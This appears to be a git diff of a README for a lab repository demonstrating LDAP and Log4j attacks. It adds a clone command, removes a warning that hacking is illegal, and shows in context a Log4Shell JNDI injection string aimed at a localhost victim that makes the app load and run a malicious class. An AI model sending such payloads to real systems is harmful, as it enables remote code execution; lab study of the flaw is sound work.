@@ -6,7 +6,7 @@ LDAP and Log4j attack landscape
 2. Clone this project:
 
 ```
-
+git clone git@github.com:abhi608/ldap_attacks.git
 ```
 
 3. Go into the folder:
@@ -56,5 +56,3 @@ http://localhost:8000/hallo?name=${jndi:ldap://localhost:10389/cn=badcode,dc=pre
 ```
 
 The victim application will write into its log and the ldap query will be executed. The result of the Ldap query will make the victim loading the malicious class from the HTTP server and executing it.
-
-**Please be aware that even hacking attempts are illegal!**
